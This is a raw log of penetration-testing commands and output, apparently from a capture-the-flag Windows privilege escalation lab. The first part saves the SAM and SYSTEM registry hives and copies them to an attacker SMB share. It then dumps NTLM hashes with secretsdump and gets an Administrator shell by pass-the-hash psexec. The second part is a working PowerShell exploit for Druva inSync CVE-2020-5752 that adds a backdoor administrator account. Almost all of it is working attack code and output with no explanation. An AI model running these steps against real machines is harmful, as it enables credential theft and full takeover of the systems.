
C:\Windows\system32>whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== ========
SeBackupPrivilege             Back up files and directories  Disabled
SeRestorePrivilege            Restore files and directories  Disabled
SeShutdownPrivilege           Shut down the system           Disabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Disabled

C:\Windows\system32>

Microsoft Windows [Version 10.0.17763.1821]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== ========
SeBackupPrivilege             Back up files and directories  Disabled
SeRestorePrivilege            Restore files and directories  Disabled
SeShutdownPrivilege           Shut down the system           Disabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Disabled

C:\Windows\system32>reg save hklm\system C:\Users\THMBackup\system.hive
The operation completed successfully.

C:\Windows\system32>reg save hklm\sam C:\Users\THMBackup\sam.hive
The operation completed successfully.

C:\Windows\system32>copy C:\Users\THMBackup\sam.hive \\10.10.122.215\public\
        1 file(s) copied.

C:\Windows\system32>copy C:\Users\THMBackup\system.hive \\10.10.122.215\public\
        1 file(s) copied.

-------------------------------------------------------


root@ip-10-10-122-215:~# mkdir share
root@ip-10-10-122-215:~# mkdir share
mkdir: cannot create directory \u2018share\u2019: File exists
root@ip-10-10-122-215:~# python3.9 /opt/impacket/examples/smbserver.py -smb2support -username THMBackup -password CopyMaster555 public share
Impacket v0.10.1.dev1+20220606.123812.ac35841f - Copyright 2022 SecureAuth Corporation

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed
[*] Incoming connection (10.10.111.225,49731)
[*] AUTHENTICATE_MESSAGE (WPRIVESC2\THMBackup,WPRIVESC2)
[*] User WPRIVESC2\THMBackup authenticated successfully
[*] THMBackup::WPRIVESC2:aaaaaaaaaaaaaaaa:784e89fde176f0efb3efb7fe3510250d:010100000000000080b345644cbad801cc85f4d47317e77b0000000001001000670070004b006f00610052006600460003001000670070004b006f00610052006600460002001000620059006b004500670066004d00730004001000620059006b004500670066004d0073000700080080b345644cbad80106000400020000000800300030000000000000000000000000300000e17c75f37612925fdd9be8b1d6c655bbcf0dc4dad942b7d85b9f15f1eac967ca0a001000000000000000000000000000000000000900240063006900660073002f00310030002e00310030002e003100320032002e003200310035000000000000000000
[*] Connecting Share(1:IPC$)
[*] Connecting Share(2:public)
[*] Disconnecting Share(1:IPC$)
[*] Disconnecting Share(2:public)
[*] Closing down connection (10.10.111.225,49731)
[*] Remaining connections []
[*] Incoming connection (10.10.111.225,49732)
[*] AUTHENTICATE_MESSAGE (WPRIVESC2\THMBackup,WPRIVESC2)
[*] User WPRIVESC2\THMBackup authenticated successfully
[*] THMBackup::WPRIVESC2:aaaaaaaaaaaaaaaa:d5c494aa315aca5ecd6b49aaf918c212:01010000000000008048006f4cbad80146de2da1acfce8da0000000001001000670070004b006f00610052006600460003001000670070004b006f00610052006600460002001000620059006b004500670066004d00730004001000620059006b004500670066004d007300070008008048006f4cbad80106000400020000000800300030000000000000000000000000300000e17c75f37612925fdd9be8b1d6c655bbcf0dc4dad942b7d85b9f15f1eac967ca0a001000000000000000000000000000000000000900240063006900660073002f00310030002e00310030002e003100320032002e003200310035000000000000000000
[*] Connecting Share(1:public)
[*] Disconnecting Share(1:public)
[*] Closing down connection (10.10.111.225,49732)
[*] Remaining connections []

root@ip-10-10-122-215:~/share# ls
sam.hive  system.hive
root@ip-10-10-122-215:~/share# ls
sam.hive  system.hive
root@ip-10-10-122-215:~/share# python3.9 /opt/impacket/examples/secretsdump.py -sam sam.hive -system system.hive LOCAL
Impacket v0.10.1.dev1+20220606.123812.ac35841f - Copyright 2022 SecureAuth Corporation

[*] Target system bootKey: 0x36c8d26ec0df8b23ce63bcefa6e2d821
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:8f81ee5558e2d1205a84d07b0e3b34f5:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:58f8e0214224aebc2c5f82fb7cb47ca1:::
THMBackup:1008:aad3b435b51404eeaad3b435b51404ee:6c252027fb2022f5051e854e08023537:::
THMTakeOwnership:1009:aad3b435b51404eeaad3b435b51404ee:0af9b65477395b680b822e0b2c45b93b:::
[*] Cleaning up... 
root@ip-10-10-122-215:~/share# 
root@ip-10-10-122-215:~/share# 
root@ip-10-10-122-215:~/share#  python3.9 /opt/impacket/examples/psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:8f81ee5558e2d1205a84d07b0e3b34f5 administrator@10.10.111.225
Impacket v0.10.1.dev1+20220606.123812.ac35841f - Copyright 2022 SecureAuth Corporation

[*] Requesting shares on 10.10.111.225.....
[*] Found writable share ADMIN$
[*] Uploading file baBNMHqK.exe
[*] Opening SVCManager on 10.10.111.225.....
[*] Creating service uymS on 10.10.111.225.....
[*] Starting service uymS.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.17763.1821]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32> 
C:\Users\Administrator\Desktop> dir
 Volume in drive C has no label.
 Volume Serial Number is A8A4-C362

 Directory of C:\Users\Administrator\Desktop

05/04/2022  12:58 PM    <DIR>          .
05/04/2022  12:58 PM    <DIR>          ..
06/21/2016  03:36 PM               527 EC2 Feedback.website
06/21/2016  03:36 PM               554 EC2 Microsoft Windows Guide.website
05/04/2022  12:59 PM                20 flag.txt
               3 File(s)          1,101 bytes
               2 Dir(s)  15,590,223,872 bytes free

C:\Users\Administrator\Desktop> type flag.txt
THM{SEFLAGPRIVILEGE}
C:\Users\Administrator\Desktop> 




# Exploit Title: Druva inSync Windows Client 6.6.3 - Local Privilege Escalation (PowerShell)
# Date: 2020-12-03
# Exploit Author: 1F98D
# Original Author: Matteo Malvica
# Vendor Homepage: druva.com
# Software Link: https://downloads.druva.com/downloads/inSync/Windows/6.6.3/inSync6.6.3r102156.msi
# Version: 6.6.3
# Tested on: Windows 10 (x64)
# CVE: CVE-2020-5752
# References: https://www.matteomalvica.com/blog/2020/05/21/lpe-path-traversal/
# Druva inSync exposes an RPC service which is vulnerable to a command injection attack.

$ErrorActionPreference = "Stop"

$cmd = " net user pwnd SimplePass123 /add & net localgroup administrators pwnd /add"

$s = New-Object System.Net.Sockets.Socket(
    [System.Net.Sockets.AddressFamily]::InterNetwork,
    [System.Net.Sockets.SocketType]::Stream,
    [System.Net.Sockets.ProtocolType]::Tcp
)
$s.Connect("127.0.0.1", 6064)

$header = [System.Text.Encoding]::UTF8.GetBytes("inSync PHC RPCW[v0002]")
$rpcType = [System.Text.Encoding]::UTF8.GetBytes("$([char]0x0005)`0`0`0")
$command = [System.Text.Encoding]::Unicode.GetBytes("C:\ProgramData\Druva\inSync4\..\..\..\Windows\System32\cmd.exe /c $cmd");
$length = [System.BitConverter]::GetBytes($command.Length);

$s.Send($header)
$s.Send($rpcType)
$s.Send($length)
$s.Send($command)








C:\Windows\system32>whoami
wprivesc3\pwnd

C:\Windows\system32>type C:\Users\Administrator\Desktop\flag.txt
THM{EZ_DLL_PROXY_4ME}
C:\Windows\system32>
